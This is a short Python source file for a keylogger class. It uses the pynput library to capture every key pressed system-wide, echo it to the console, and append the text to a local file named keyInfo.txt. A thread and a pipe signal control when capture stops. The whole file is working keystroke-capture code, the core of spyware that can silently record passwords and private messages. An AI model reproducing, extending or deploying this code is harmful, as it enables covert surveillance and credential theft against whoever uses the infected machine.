import threading
from multiprocessing import Manager
from ctypes import c_char_p
from pynput.keyboard import Listener,Key
from multiprocessing import Pipe,Queue
from components.checkService import *
import os
import multiprocessing as mp



class Keylogger:
    def __init__(self):
        self.keys = []
        self.thread_stop = False
        self.count = 0 
        self.file_path = os.getcwd() + "\\" + "keyInfo.txt"
        
    # def __keylog__(self,response):
    def __keylog__(self,side_1,side_2):
    
        while True:
            def on_press(key):
                self.keys.append(key)
                print(key)
                self.count += 1
                if self.count >=1:
                    self.count = 0
                    write_file(self.keys)
                    self.keys = [] 

            def write_file(keys):
                with open(self.file_path , "a") as f:
                    for key in keys:
                        k = str(key).replace("'","")
                        if k.find("space") > 0:
                            f.write('\n')
                            
                        elif k.find("Key") == -1:
                            f.write(k)
    
            def on_release(key):
                if key == Key.esc:
                    return False

                check  = self.resp.value
                if check :
                    return False
                
            def cap_logs():
                with Listener(on_press = on_press , on_release = on_release) as listener:
                    listener.join()
            
            manager = Manager()
            self.resp = manager.Value(c_char_p,"")
            cap_log_p = threading.Thread(target=cap_logs)
            cap_log_p.start()

            check = side_2.recv()
            if check:
                self.resp.value = True
                cap_log_p.join()
                return
        
            
                
            
                
                
            
    
            
          
